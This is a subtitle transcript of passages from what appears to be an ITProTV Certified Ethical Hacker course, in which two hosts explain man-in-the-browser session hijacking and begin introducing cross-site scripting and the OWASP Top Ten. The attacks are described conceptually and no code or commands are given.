00:46:29.760\nAnd as a result of that, what we're doing\nis we're redirecting all of that data and\n\n991\n00:46:29.760 --> 00:46:30.460\nwe're capturing it.\n\n992\n00:46:30.460 --> 00:46:33.460\nSo we're gonna be able to\nscrape all that data, and so\n\n993\n00:46:33.460 --> 00:46:36.450\nwhen you log in thinking\nyou're in successfully,\n\n994\n00:46:36.450 --> 00:46:39.740\nyou're actually sending your data\nto us as part of the process.\n\n995\n00:46:39.740 --> 00:46:42.930\nThe browser sends the form and\nmodified values to the server.\n\n996\n00:46:42.930 --> 00:46:44.565\nBut we also keep a copy.\n\n997\n00:46:44.565 --> 00:46:45.700\n&gt;&gt; Right.\n\n998\n00:46:45.700 --> 00:46:46.930\n&gt;&gt; And so we have that.\n\n999\n00:46:46.930 --> 00:46:49.210\nStep 10, the server receives\nthe modified values but\n\n1000\n00:46:49.210 --> 00:46:51.660\ncannot distinguish between\nthe original and the modified data.\n\n1001\n00:46:51.660 --> 00:46:55.990\nSo we're sending the data but we're\nsending it according to what we want.\n\n1002\n00:46:55.990 --> 00:46:59.820\nThe information we wanna know and/or that\nwe are potentially trying to compromise.\n\n1003\n00:46:59.820 --> 00:47:03.280\nAfter the server does the transaction,\na recipient, or rather receipt,\n\n1004\n00:47:03.280 --> 00:47:07.670\nis sent back to the generated,\nexcuse me, I'm gonna try it again.\n\n1005\n00:47:07.670 --> 00:47:08.850\nA receipt is sent back.\n\n1006\n00:47:08.850 --> 00:47:10.343\nI'm tripping over receipt, recipient.\n\n1007\n00:47:10.343 --> 00:47:12.727\n&gt;&gt; [LAUGH]\n&gt;&gt; A receipt is sent back to the browser\n\n1008\n00:47:12.727 --> 00:47:17.387\nwhere the target is sitting and the\nrecipient sees that their transaction's\n\n1009\n00:47:17.387 --> 00:47:21.560\nsuccessful but, if you take a look\nat there, so we go down step 12.\n\n1010\n00:47:21.560 --> 00:47:24.562\nThe browser receives it and\nwe show it for the transaction.\n\n1011\n00:47:24.562 --> 00:47:25.070\n&gt;&gt; Mm-hm.\n\n1012\n00:47:25.070 --> 00:47:28.070\n&gt;&gt; The browser displays the receipt but\nwe display the receipt, again,\n\n1013\n00:47:28.070 --> 00:47:29.642\nthe malware is operating.\n\n1014\n00:47:29.642 --> 00:47:33.140\n&gt;&gt; So we swap and we show the user what\nlooks like the normal transaction.\n\n1015\n00:47:33.140 --> 00:47:35.305\nThey don't know that we've modified it or\nchanged it.\n\n1016\n00:47:35.305 --> 00:47:39.056\nWe just show them what they expect\nto see as opposed to what we did.\n\n1017\n00:47:39.056 --> 00:47:42.178\nAnd as a result, I used to think that\nthis original transaction was received by\n\n1018\n00:47:42.178 --> 00:47:43.680\nthe server, no interruptions.\n\n1019\n00:47:43.680 --> 00:47:47.249\nBecause remember, man in the browser is\nessentially man in the middle attack but\n\n1020\n00:47:47.249 --> 00:47:48.573\nin the middle is the browser.\n\n1021\n00:47:48.573 --> 00:47:49.959\n&gt;&gt; Okay.\n&gt;&gt; That's the pivot point were we\n\n1022\n00:47:49.959 --> 00:47:51.300\ntransit all the traffic through.\n\n1023\n00:47:51.300 --> 00:47:54.341\nIt becomes the proxy that essentially\ncontrols traffic flow and\n\n1024\n00:47:54.341 --> 00:47:55.418\nmodifies the stream.\n\n1025\n00:47:55.418 --> 00:47:55.980\n&gt;&gt; Mm.\n&gt;&gt; So\n\n1026\n00:47:55.980 --> 00:47:59.550\nwe're hiding in the browser as opposed to\nhiding on a separate server somewhere out\n\n1027\n00:47:59.550 --> 00:48:00.130\non the network.\n\n1028\n00:48:00.130 --> 00:48:00.840\n&gt;&gt; Right.\n&gt;&gt; To do this.\n\n1029\n00:48:00.840 --> 00:48:02.970\nSo this is what a man in\nthe browser attack is.\n\n1030\n00:48:02.970 --> 00:48:04.700\n&gt;&gt; Very cool,\n&gt;&gt; Yeah, yeah.\n\n1031\n00:48:04.700 --> 00:48:05.242\nPretty cool.\n\n1032\n00:48:05.242 --> 00:48:07.286\nKind of interesting if you think about it.\n\n1033\n00:48:07.286 --> 00:48:08.070\n&gt;&gt; Mm-hm.\n\n1034\n00:48:08.070 --> 00:48:11.130\n&gt;&gt; So, we go through that whole thing and\nthen that actually how we're\n\n1035\n00:48:11.130 --> 00:48:14.910\nable to compromise the extension or,\nexcuse me, through the compromise security\n\n1036\n00:48:14.910 --> 00:48:18.320\nextensions, how we're able to actually\nexecute the man in the browser attack.\n\n1037\n00:48:18.320 --> 00:48:21.140\nSo, kind of interesting stuff\nwhen you think about it.\n\n1038\n00:48:21.140 --> 00:48:21.769\n&gt;&gt; Absolutely.\n\n1039\n00:48:21.769 --> 00:48:22.440\n&gt;&gt; Yeah.\n\n1040\n00:48:22.440 --> 00:48:24.720\n&gt;&gt; All right Adam,\nanother great episode episode there.\n\n1041\n00:48:24.720 --> 00:48:27.900\nReally took a look at session hijacking.\n\n1042\n00:48:27.900 --> 00:48:31.650\nTalked a little about man in the middle\nand comparing that with session hijacking.\n\n1043\n00:48:31.650 --> 00:48:34.395\nAnd then a great look there at\nthe end at man in the browser.\n\n1044\n00:48:34.395 --> 00:48:38.694\nKind of a modified version of that man in\nthe middle attack, so we appreciate that.\n\n1045\n00:48:38.694 --> 00:48:39.312\n&gt;&gt; Mm-hm.\n\n1046\n00:48:39.312 --> 00:48:40.750\nHope everybody out there enjoyed watching.\n\n1047\n00:48:40.750 --> 00:48:43.990\nSigning off for ITProTV,\nI'm Mike Roderick.\n\n1048\n00:48:43.990 --> 00:48:47.900\n&gt;&gt; I'm a browser of modified DLO which you\ndon't want to allow to run on your system,\n\n1049\n00:48:47.900 --> 00:48:50.495\nbecause I will session hijack you.\n\n1050\n00:48:50.495 --> 00:48:53.907\n&gt;&gt; [LAUGH] We'll see you next time.\n\n1051\n00:48:53.907 --> 00:49:02.340\n[MUSIC]\n\n",

00:00:18.843\nI'm you're host Mike Rodrick and\ntoday we're doing our CEH version 9.\n\n4\n00:00:18.843 --> 00:00:22.310\nSpecifically in this episode,\nwe're actually doing a continuation.\n\n5\n00:00:22.310 --> 00:00:25.470\nWe started our session hijacking\nin the previous episode.\n\n6\n00:00:25.470 --> 00:00:27.330\nSo if you missed that one,\nmake sure you go back and check it out.\n\n7\n00:00:27.330 --> 00:00:29.040\nLot of good information there.\n\n8\n00:00:29.040 --> 00:00:32.180\nAnd we're gonna continue\non with that conversation.\n\n9\n00:00:32.180 --> 00:00:34.040\nAnd here of course, is Mr. Adam Gordon.\n\n10\n00:00:34.040 --> 00:00:35.090\nHow you doing, Adam?\n\n11\n00:00:35.090 --> 00:00:36.150\n&gt;&gt; I am good, I am good.\n\n12\n00:00:36.150 --> 00:00:39.161\nSo we're not talking about the lost\nepisodes that got hijacked that nobody\n\n13\n00:00:39.161 --> 00:00:40.080\nknows about, right?\n\n14\n00:00:40.080 --> 00:00:40.981\nSo I guess those are hidden.\n\n15\n00:00:40.981 --> 00:00:41.575\n&gt;&gt; Wait, do you have those?\n\n16\n00:00:41.575 --> 00:00:43.260\n&gt;&gt; We call those Easter eggs.\n\n17\n00:00:43.260 --> 00:00:45.125\nYou'll have to find them at some point.\n\n18\n00:00:45.125 --> 00:00:47.440\n&gt;&gt; [LAUGH]\n&gt;&gt; I think Zidas has them actually.\n\n19\n00:00:48.880 --> 00:00:51.190\nHe's got them in his pocket,\nhe's reaching in there, I think he's-\n\n20\n00:00:51.190 --> 00:00:51.810\n&gt;&gt; [LAUGH]\n\n21\n00:00:51.810 --> 00:00:53.385\n&gt;&gt; He's secreting them over there.\n\n22\n00:00:53.385 --> 00:00:54.860\n&gt;&gt; [LAUGH]\n&gt;&gt; So maybe he'll post them up later,\n\n23\n00:00:54.860 --> 00:00:55.590\nwe'll see what happens.\n\n24\n00:00:55.590 --> 00:00:58.860\nSo anyway, we are on part two,\nas opposed to part one,\n\n25\n00:00:58.860 --> 00:01:01.725\nwhich always comes before part two but\nafter part three.\n\n26\n00:01:01.725 --> 00:01:03.340\n&gt;&gt; [LAUGH]\n&gt;&gt; Make that work and\n\n27\n00:01:03.340 --> 00:01:04.900\nyou'll find the Easter eggs.\n\n28\n00:01:04.900 --> 00:01:10.380\nSo we're continuing to talk about session\nhijacking in the end of the last episode.\n\n29\n00:01:10.380 --> 00:01:13.050\nWhich as Mike said, all kidding aside,\nis good for you to go back and\n\n30\n00:01:13.050 --> 00:01:14.330\nwatch prior to starting this one.\n\n31\n00:01:14.330 --> 00:01:16.440\nI know sometimes you like to\njump around a little bit and\n\n32\n00:01:16.440 --> 00:01:17.730\nthere's nothing wrong with that.\n\n33\n00:01:17.730 --> 00:01:21.740\nBut we talked about a lot of the\nbackground material, the thought process,\n\n34\n00:01:21.740 --> 00:01:24.790\nhow some of these attack works,\nman in the browser.\n\n35\n00:01:24.790 --> 00:01:27.500\nAttack for instance,\nwhich is a form of man in the middle.\n\n36\n00:01:27.500 --> 00:01:30.124\nBut we really set up a lot of\nthe stuff that will be important for\n\n37\n00:01:30.124 --> 00:01:31.905\nwhat we're gonna do going forward here.\n\n38\n00:01:31.905 --> 00:01:36.015\nWe're gonna talk a little bit more about\nspecific kinds of attacks that we can use\n\n39\n00:01:36.015 --> 00:01:39.130\nto compromise session\nIDs on the client side.\n\n40\n00:01:39.130 --> 00:01:41.240\nWe'll take a look at\nthe cross-site scripting.\n\n41\n00:01:41.240 --> 00:01:44.080\nXSS attacks, we'll take a look\nat that in just a minute.\n\n42\n00:01:44.080 --> 00:01:48.730\nThere's things like JavaScript code\nattacks, which are obviously problematic.\n\n43\n00:01:48.730 --> 00:01:51.630\nWe have trojans,\nwe'll talk about malware and those issues.\n\n44\n00:01:51.630 --> 00:01:55.170\nI'm actually gonna jump in and do a little\ndemo in a minute or two for you as well.\n\n45\n00:01:55.170 --> 00:01:58.200\nWe talk a lot and have talked,\nnot just in this last episode,\n\n46\n00:01:58.200 --> 00:02:01.850\nbut in prior blocks of episodes\nin different topical areas.\n\n47\n00:02:01.850 --> 00:02:05.270\nI've referenced reconnaissance,\nfingerprinting, sniffing,\n\n48\n00:02:05.270 --> 00:02:10.010\nmalware as episode blocks and content\nareas that you wanna go back and look at.\n\n49\n00:02:10.010 --> 00:02:12.220\nAlso cryptography,\nanother one that would be important.\n\n50\n00:02:12.220 --> 00:02:14.380\nWe talked about SQL\ninjection a little bit here.\n\n51\n00:02:14.380 --> 00:02:16.870\nWe jumped around a lot\nin the knowledge areas.\n\n52\n00:02:16.870 --> 00:02:18.950\nPicking on pieces of information.\n\n53\n00:02:18.950 --> 00:02:21.460\nBut one of the few things we didn't\nactually do directly although we\n\n54\n00:02:21.460 --> 00:02:22.340\ntalked about it.\n\n55\n00:02:22.340 --> 00:02:24.725\nIs show you what it would be like to run\n\n56\n00:02:24.725 --> 00:02:27.365\nsome sort of a capture\nprogram get packets.\n\n57\n00:02:27.365 --> 00:02:29.815\nAnd then potentially manipulate them and\nsend them back into the stream.\n\n58\n00:02:29.815 --> 00:02:33.225\nSo I'm not gonna do the whole thing\nbecause it is an involved demo.\n\n59\n00:02:33.225 --> 00:02:36.675\nAnd also it is one of those things where\nyou get a certain amount of knowledge,\n\n60\n00:02:36.675 --> 00:02:37.897\nyou have a general idea.\n\n61\n00:02:37.897 --> 00:02:40.617\nWe've stopped short at\nseveral places critically\n\n62\n00:02:40.617 --> 00:02:42.477\nsaying you would do these\nthings going forward.\n\n63\n00:02:42.477 --> 00:02:46.217\nBut we're not gonna show you every little\nnook and cranny and piece of information.\n\n64\n00:02:46.217 --> 00:02:51.220\nSo we don't wanna give you all of\nthe information necessary to do evil.\n\n65\n00:02:51.220 --> 00:02:55.405\nWe just wanna prime you for being able to\ndo evil and let nature take its course.\n\n66\n00:02:55.405 --> 00:02:56.370\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n67\n00:02:56.370 --> 00:02:57.730\nwe are gonna show you how to do that,\n\n68\n00:02:57.730 --> 00:03:02.450\nI've got little demo set up with\nthe Zap Attack Proxy which is an OWASP\n\n69\n00:03:02.450 --> 00:03:04.760\ntool that you can download\nfrom the OWASP website.\n\n70\n00:03:04.760 --> 00:03:07.450\nMichael show us the OWASP website\nhere in a couple of minutes and\n\n71\n00:03:07.450 --> 00:03:09.220\nyou'll be able to search for\nthat obviously.\n\n72\n00:03:09.220 --> 00:03:11.070\nKind of very versatile tool, pretty cool.\n\n73\n00:03:11.070 --> 00:03:14.040\nWe'll go in, we've already got it setup,\nwe've captured some traffic.\n\n74\n00:03:14.040 --> 00:03:18.270\nWe're gonna show you what you would do\nto modify a get command or a get header.\n\n75\n00:03:18.270 --> 00:03:21.890\nManipulate the URLs and then actually\njust repurpose them and send them out.\n\n76\n00:03:21.890 --> 00:03:25.190\nSo I'm gonna start talking about some of\nthat and really delve in a little bit.\n\n77\n00:03:25.190 --> 00:03:28.090\nOr if Mike has anything better,\nI'm always open to ideas, I don't know.\n\n78\n00:03:28.090 --> 00:03:29.189\nMaybe what you did for lunch?\n\n79\n00:03:30.360 --> 00:03:32.653\n&gt;&gt; It just wasn't that interesting\nunfortunately [CROSSTALK].\n\n80\n00:03:32.653 --> 00:03:35.580\n&gt;&gt; All right, well then, I guess we're\nstuck talking about this stuff then.\n\n81\n00:03:35.580 --> 00:03:36.645\nI tried, I did.\n\n82\n00:03:36.645 --> 00:03:39.070\n&gt;&gt; [LAUGH]\n&gt;&gt; He's just never prepared.\n\n83\n00:03:39.070 --> 00:03:42.375\nWe asked but\nhe never does what he's supposed to do.\n\n84\n00:03:42.375 --> 00:03:47.110\nSo let's talk about XSS a little bit,\nI know that we actually did go through,\n\n85\n00:03:47.110 --> 00:03:48.220\nyou did the majority of the work.\n\n86\n00:03:48.220 --> 00:03:52.248\nI really just sat and watch, but I know\ncuz that's truly what I did [LAUGH].\n\n87\n00:03:52.248 --> 00:03:55.300\nI just said I need this, here's what I\nlike it to look like and there you are,\n\n88\n00:03:55.300 --> 00:03:56.760\nMike went out and created it.\n\n89\n00:03:56.760 --> 00:04:01.040\nBut I know that you created a graphic\nforce that is to show us how XSS works.\n\n90\n00:04:01.040 --> 00:04:04.290\nAnd we have that up on the screen\nthrough the magic of modern switching,\n\n91\n00:04:04.290 --> 00:04:05.820\nI didn't even get to go vush!\n\n92\n00:04:05.820 --> 00:04:06.580\n&gt;&gt; May be it's too correct.\n\n93\n00:04:06.580 --> 00:04:09.210\n&gt;&gt; Which I've on worked on that\nwhole thing, I just did this but\n\n94\n00:04:09.210 --> 00:04:10.510\nthe sound effect, the vush.\n\n95\n00:04:10.510 --> 00:04:13.380\n&gt;&gt; It makes you feel like you\nwasted your time working on it.\n\n96\n00:04:13.380 --> 00:04:14.440\n&gt;&gt; I did waste my time.\n\n97\n00:04:14.440 --> 00:04:15.830\nI think I should leave.\n\n98\n00:04:15.830 --> 00:04:17.247\n&gt;&gt; [LAUGH]\n&gt;&gt; I think I should go,\n\n99\n00:04:17.247 --> 00:04:21.240\nI'm not appreciated here and\nas far as I can tell I'm no longer needed.\n\n100\n00:04:21.240 --> 00:04:22.390\nSo I think I should leave.\n\n101\n00:04:22.390 --> 00:04:24.830\n&gt;&gt; Titus said he'd make a Starbucks\nround for you maybe later.\n\n102\n00:04:24.830 --> 00:04:27.430\n&gt;&gt; That would definitely go a long\nway towards making me feel better.\n\n103\n00:04:27.430 --> 00:04:29.870\nBut only if he stands up and\ndoes the vush when he gives me the coffee.\n\n104\n00:04:29.870 --> 00:04:32.190\nOtherwise I'm gonna feel\nlike it was a total waste.\n\n105\n00:04:32.190 --> 00:04:34.360\nAll right, so let's talk about XSS here.\n\n106\n00:04:34.360 --> 00:04:39.320\nSo cross site scripting, this is one\nof the OWASP's Top Ten web application\n\n107\n00:04:39.320 --> 00:04:42.020\nvulnerability exploits that\nwe need to be aware of.\n\n108\n00:04:42.020 --> 00:04:44.840\nI'm gonna ask you if you can to do\nme a favor just while we're in this.\n\n109\n00:04:44.840 --> 00:04:46.990\nWe're gonna come back to\nthis diagram in a minute.\n\n110\n00:04:46.990 --> 00:04:51.470\nI just wanna show the kind gentle folk of\nour audience out there on where they can\n\n111\n00:04:51.470 --> 00:04:55.930\nfind information on the OWASP's Top Ten I\nknow you and I had this set up and\n\n112\n00:04:55.930 --> 00:04:56.750\nnot that one.\n\n113\n00:04:56.750 --> 00:04:59.280\nThere we go [LAUGH],\nthat would be something totally different.\n\n114\n00:04:59.280 --> 00:05:02.660\nAll right, so Todd, so you can pull\ndown the box in box for just a minute,\n\n115\n00:05:02.660 --> 00:05:05.310\njust let them see, thank you, just let\nthem see the full screen, perfect.\n\n116\n00:05:05.310 --> 00:05:07.500\nSo when we do the OWASP's Top Ten.\n\n117\n00:05:07.500 --> 00:05:10.380\nI know that you're gonna post\nthe URL as we always do,\n\n118\n00:05:10.380 --> 00:05:12.640\nI just wanna remind everybody\nout there two things.\n\n119\n00:05:12.640 --> 00:05:15.680\nThis is a moment in time when\nwe're doing the episode live.\n\n120\n00:05:15.680 --> 00:05:19.140\nThis information may very\nwell change in the next\n\n121\n00:05:19.140 --> 00:05:21.140\nthree to six months as\nyou view this episode.\n\n122\n00:05:21.140 --> 00:05:24.760\nGoing forward into the latter part\nof 2016 or at the end of 2016 and\n\n123\n00:05:24.760 --> 00:05:27.130\nAugust right now, right?\n\n124\n00:05:27.130 --> 00:05:30.908\nSo going into the last few\nmonths of 2016 into early 2017.\n\n125\n00:05:30.908 --> 00:05:32.609\nDepending on when you view this,\n\n126\n00:05:32.609 --> 00:05:35.660\nthe new version of the Top Ten\nis being compiled as we speak.\n\n127\n00:05:35.660 --> 00:05:37.120\nThe version we're gonna look at now and\n\n128\n00:05:37.120 --> 00:05:41.870\njust reminds you about and that we often\ntalk about is the 2013 Top Ten list.\n\n129\n00:05:41.870 --> 00:05:43.700\nThey do this every three years.\n\n130\n00:05:43.700 --> 00:05:45.310\nThe data gathering for\n\n131\n00:05:45.310 --> 00:05:49.960\nthe 2016 version was done earlier\nthis year in 2016 in June and July.\n\n132\n00:05:49.960 --> 00:05:53.125\nThe aggregation of the data\nis taking place as we speak,\n\n133\n00:05:53.125 --> 00:05:56.115\nis actually had a little announcement\nright there that they tell you.\n\n134\n00:05:56.115 --> 00:05:58.740\nThe deadline were still late July\nif you will be able to submit.\n\n135\n00:05:58.740 --> 00:06:03.350\nLate in 2016, early 2017,\nis when the new 2016 version\n\n136\n00:06:03.350 --> 00:06:06.780\nof this list will launch and\nwe'll be good for another three years.\n\n137\n00:06:06.780 --> 00:06:10.760\nI'm sure in future episodes as we get\ninvolved with other security stuff at\n\n138\n00:06:10.760 --> 00:06:13.730\nsome point late in the year, we'll\nreference it and it will be available.\n\n139\n00:06:13.730 --> 00:06:14.770\nWe'll obviously see it.\n\n140\n00:06:14.770 --> 00:06:17.320\nBut if you look at this in six months,\nright?\n\n141\n00:06:17.320 --> 00:06:20.210\nAt the end of 2016, 2017,\nsomething like that and go hey,\n\n142\n00:06:20.210 --> 00:06:22.000\nwhy are they talking about that old thing?\n\n143\n00:06:22.000 --> 00:06:23.130\nWhat the hell's going on with that?\n\n144\n00:06:23.130 --> 00:06:24.480\n&gt;&gt; Doesn't Adam know there's a new list?\n\n145\n00:06:24.480 --> 00:06:26.565\n&gt;&gt; Yeah, why didn't Mike tell him?\n\n146\n00:06:26.565 --> 00:06:27.650\n&gt;&gt; [LAUGH]\n&gt;&gt; I could blame Mike for that.\n\n147\n00:06:27.650 --> 00:06:30.290\nI could say it was Mike's fault\ncuz he should have known.\n\n148\n00:06:30.290 --> 00:06:34.160\nBut I just want you to know and\nbe aware of the fact, we are aware of it.\n\n149\n00:06:34.160 --> 00:06:37.400\nBut obviously we wanna\nreference the information for\n\n150\n00:06:37.400 --> 00:06:39.410\nyou at the time we put\nthe episode together.\n\n151\n00:06:39.410 --> 00:06:41.780\nGive you the disclaimer in\nthis case that it will update.\n\n152\n00:06:41.780 --> 00:06:43.190\nAnd obviously you wanna be aware of that.\n\n153\n00:06:43.190 --> 00:06:46.130\nThe good news is right clearly check\nback on the site when there is\n\n154\n00:06:46.130 --> 00:06:47.030\nnew material there.\n\n155\n00:06:47.030 --> 00:06:51.460\nYou reference it and you use it, so\njust be aware of that as we talk about it.\n\n156\n00:06:51.460 --> 00:06:54.870\nI'm pretty confident that we'll\nsee XSS cross site scripting and\n\n157\n00:06:54.870 --> 00:06:58.200\nCSRF cross site request forgeries\nprobably still on the list.\n\n158\n00:06:58.200 --> 00:06:59.620\n&gt;&gt; It's not gonna go away anytime soon.\n\n159\n00:06:59.620 --> 00:07:01.050\n&gt;&gt; I don't think it's\ngonna be off the list.\n\n160\n00:07:01.050 --> 00:07:03.340\nIt may shift just in terms of the number,\nbut\n\n161\n00:07:03.340 --> 00:07:04.910\nI'm pretty confident it's\ngonna still be there.\n\n162\n00:07:04.910 --> 00:07:07.100\nSo when you go, do we click on the-\n&gt;&gt; I did.\n\n163\n00:07:07.100 --> 00:07:09.260\n&gt;&gt; I know you did, right, so\nyou got the PDF link there.\n\n164\n00:07:09.260 --> 00:07:11.710\nSo yeah, we go to page,\nwhere's that, page 6?\n\n165\n00:07:11.710 --> 00:07:12.660\n&gt;&gt; Page 6, uh-huh.\n\n166\n00:07:12.660 --> 00:07:15.320\n&gt;&gt; So we have often talked about this and\n\n167\n00:07:15.320 --> 00:07:17.260\nI'm just reminding you\nof where to find it.\n\n168\n00:07:17.260 --> 00:07:21.050\nThere is a nice summary\none page top ten in there.\n\n169\n00:07:21.050 --> 00:07:23.831\nYou've got A1 through A10,\nall the different vulnerabilities,\n\n170\n00:07:23.831 --> 00:07:25.370\ninjection at the top of the list.\n\n171\n00:07:25.370 --> 00:07:28.640\nWe've referenced this in our\nSQL injection conversations in\n\n172\n00:07:28.640 --> 00:07:30.915\nother episodes that you\ncan take a look at.\n\n173\n00:07:30.915 --> 00:07:33.170\nWe've got, I think it highlighted one of\nthe ones there for me if I'm not mistaken.\n\n174\n00:07:33.170 --> 00:07:34.123\n&gt;&gt; Cross-Site Scripting.\n&gt;&gt; Right,\n\n175\n00:07:34.123 --> 00:07:36.445\nCross-Site Scripting number three.\n\n176\n00:07:36.445 --> 00:07:38.975\nAnd then Cross-Site Request Forgery's\ndown there at number eight.\n\n177\n00:07:38.975 --> 00:07:40.545\n&gt;&gt; Yep.\n&gt;&gt; So you've got them in there.\n\n178\n00:07:40.545 --> 00:07:42.225\nYou got a little one or two sentence,\n\n179\n00:07:42.225 --> 00:07:45.640\nlittle summary there,\nalways good to be aware of what that is.\n\n180\n00:07:45.640 --> 00:07:49.200\nCan pretty much guarantee that knowledge\nof those definitions would be valuable for\n\n181\n00:07:49.200 --> 00:07:50.130\nyou on the exam.\n\n182\n00:07:51.220 --> 00:07:52.770\nWanna make sure we know how to describe.\n\n183\n00:07:52.770 --> 00:07:56.946\nI would go so far as to say I'd\nwanna know all ten on the list.\n\n184\n00:07:56.946 --> 00:07:57.945\nBe somewhat familiar with them.\n\n185\n00:07:57.945 --> 00:07:59.626\nHave a working knowledge\nof the definitions.\n\n186\n00:07:59.626 --> 00:08:01.301\nWe've discussed them in other areas.\n\n187\n00:08:01.301 --> 00:08:03.815\nWanna make sure we\nunderstand the concepts, and\n\n188\n00:08:03.815 --> 00:08:06.463\nwhy they are important to defend against,\nright?\n\n189\n00:08:06.463 --> 00:08:07.420\nAnd how we deal with them.\n\n190\n00:08:07.420 --> 00:08:10.880\nSo just calling that out there for\nyou, so that you know what it is.\n\n191\n00:08:10.880 --> 00:08:14.260\nCan we go back into, no we actually\nwanna go back into the graphic.\n\n192\n00:08:14.260 --> 00:08:15.338\n&gt;&gt; Okay.\n&gt;&gt; But we actually wanna go and\n\n193\n00:08:15.338 --> 00:08:16.228\ntalk about how it works now.\n\n194\n00:08:16.228 --> 00:08:16.961\nSo, perfect.\n\n195\n00:08:16.961 --> 00:08:18.530\nSo if we could just take a look at this.\n\n196\n00:08:18.530 --> 00:08:20.782\nCan we zoom in just,\nactually no, no, it's good.\n\n197\n00:08:20.782 --> 00:08:21.288\nIt's good.\n&gt;&gt; Okay.\n\n198\n00:08:21.288 --> 00:08:22.180\nI can see.\n\n199\n00:08:22.180 --> 00:08:24.100\nOn the other one it's actually\na lot bigger and obviously,\n\n200\n00:08:24.100 --> 00:08:25.980\nthey'll be able to see it real well,\nso that's fine.\n\n201\n00:08:25.980 --> 00:08:29.145\nNot a problem, I'll just use\na seeing eye dog and we'll be okay.\n\n202\n00:08:29.145 --> 00:08:30.290\n&gt;&gt; [LAUGH]\n&gt;&gt; No problem at all.\n\n203\n00:08:30.290 --> 00:08:31.645\nI'm gonna navigate with the force.\n\n204\n00:08:31.645 --> 00:08:32.950\n&gt;&gt; [LAUGH]\n&gt;&gt; All right,\n\n205\n00:08:32.950 --> 00:08:37.470\nso let's talk about how XSS cross\nsite scripting attacks works.\n\n206\n00:08:37.470 --> 00:08:42.192\nEssentially, what the idea is here,\nthat this enables attackers to inject\n\n207\n00:08:42.192 --> 00:08:46.120\nmalicious code scripts, right,\nrunning from the web right?\n\n208\n00:08:46.120 --> 00:08:48.660\nSo we have a webpage where\nwe're gonna be able to visit.\n\n209\n00:08:48.660 --> 00:08:52.670\nWe're gonna get some sorta code\nthat comes back from that webpage.\n\n210\n00:08:52.670 --> 00:08:56.280\nAnd it's gonna obviously be manipulated or\ncontrolled by a bad actor.\n\n211\n00:08:56.280 --> 00:08:57.660\nIt's gonna be set to do something.\n\n212\n00:08:57.660 --> 00:08:58.440\nWe're not quite sure what.\n\n213\n00:08:58.440 --> 00:09:01.710\nWhatever it does, and it's gonna\nredirect us, take us out somewhere,\n\n214\n00:09:01.710 --> 00:09:04.328\ndo something, download something.\n\n215\n00:09:04.328 --> 00:09:06.900\nThere's all of these different\nvariants that in theory can happen.\n\n216\n00:09:06.900 --> 00:09:10.750\nBut the point is, we're gonna visit\na website under the guise, right,\n\n217\n00:09:10.750 --> 00:09:12.260\nof innocent behavior, and\n\n218\n00:09:12.260 --> 00:09:15.650\nwe're going to wind up with something\na little bit more than we bargained for.\n\n219\n00:09:15.650 --> 00:09:17.100\nSome malware or\n\n220\n00:09:17.100 --> 00:09:20.170\nsomething that's gonna ultimately\nallow us to be manipulated, right?\n\n221\n00:09:20.170 --> 00:09:21.200\nThis is the goal.\n\n222\n00:09:21.200 --> 00:09:22.050\n&gt;&gt; You know what I always think?\n\n223\n00:09:22.050 --> 00:09:25.147\nI thought a lot of people got confused on\nwith this is that the hacker or the bad\n\n224\n00:09:25.147 --> 00:09:28.625\nguy or the bad actor, as you like to say,\nis not attacking the victim directly.\n\n225\n00:09:28.625 --> 00:09:31.490\n&gt;&gt; No.\nHe is attacking the web server,\n\n226\n00:09:31.490 --> 00:09:34.030\nwhich he's then using\nto host his attack and\n\n227\n00:09:34.030 --> 00:09:35.912\nyou're just getting attacked\nwhen you visit that website.\n\n228\n00:09:35.912 --> 00:09:37.230\n&gt;&gt; Essentially, yeah.\n\n229\n00:09:37.230 --> 00:09:41.830\nYou are falling victim or falling\nprey to a manipulation of the server\n\n230\n00:09:41.830 --> 00:09:44.930\nindirectly by consuming from it,\nnot directly being attacked,\n\n231\n00:09:44.930 --> 00:09:49.060\nas you pointed out, through the code\nbeing launched directly at you.\n\n232\n00:09:49.060 --> 00:09:50.700\nSo it is an important distinction.\n\n233\n00:09:50.700 --> 00:09:52.190\nAnd why is it always a hacker, by the way?\n\n234\n00:09:52.190 --> 00:09:53.001\nAnd why not a hackeress?\n\n235\n00:09:53.001 --> 00:09:53.790\n&gt;&gt; [LAUGH] I know.\n\n236\n00:09:53.790 --> 00:09:55.910\n&gt;&gt; Right, I mean,\nit very well could be somebody out there.\n\n237\n00:09:55.910 --> 00:09:57.900\nMeagan, as I said,\nhas that dark side to her.\n\n238\n00:09:57.900 --> 00:10:00.130\nEvery time she's out here and\nsitting and doing stuff,\n\n239\n00:10:00.130 --> 00:10:04.335\nI think she's actually controlling all of\nthe stuff that goes on with her phone.\n\n240\n00:10:04.335 --> 00:10:05.372\nAnd I think she's hacking and\n\n241\n00:10:05.372 --> 00:10:07.805\nup to no good when she's at the board and\nwe're not watching her.\n\n242\n00:10:07.805 --> 00:10:10.135\nSo, I think it should be\nhacker slash hackeress.\n\n243\n00:10:10.135 --> 00:10:11.245\nThat's my take on things.\n\n244\n00:10:11.245 --> 00:10:15.077\n&gt;&gt; Maybe it's a generic term, like in the\narmy, we say sir for ma'ams and sirs, or\n\n245\n00:10:15.077 --> 00:10:16.380\nsomething\n&gt;&gt; Yeah.\n\n246\n00:10:16.380 --> 00:10:17.625\nOnly if they're smaller than you.\n\n247\n00:10:17.625 --> 00:10:18.840\n&gt;&gt; [LAUGH]\n&gt;&gt; If they're bigger than you,\n\n248\n00:10:18.840 --> 00:10:22.355\nthen you address them in whatever tone\nthat they would feel is most appropriate.\n\n249\n00:10:22.355 --> 00:10:23.510\n&gt;&gt; [LAUGH]\n&gt;&gt; But yes, you're right,\n\n250\n00:10:23.510 --> 00:10:24.380\nit is a generic term.\n\n251\n00:10:24.380 --> 00:10:28.170\nWe often do say that, although,\njust totally interesting aside, random.\n\n252\n00:10:28.170 --> 00:10:30.400\nCuz it wouldn't be a good episode if we\ndidn't have at least one random aside.\n\n253\n00:10:30.400 --> 00:10:32.140\n&gt;&gt; Absolutely, and a movie referral.\n\n254\n00:10:32.140 --> 00:10:33.990\n&gt;&gt; That's coming up, but\nwe don't have a word of the day.\n\n255\n00:10:33.990 --> 00:10:34.924\nWe haven't done that one either.\n\n256\n00:10:34.924 --> 00:10:35.840\n&gt;&gt; Yeah.\n&gt;&gt; Yeah, hackeress\n\n257\n00:10:35.840 --> 00:10:36.600\ncould be the word of the day.\n\n258\n00:10:36.600 --> 00:10:38.440\n&gt;&gt; Hackeress.\n&gt;&gt; That could be the word of the 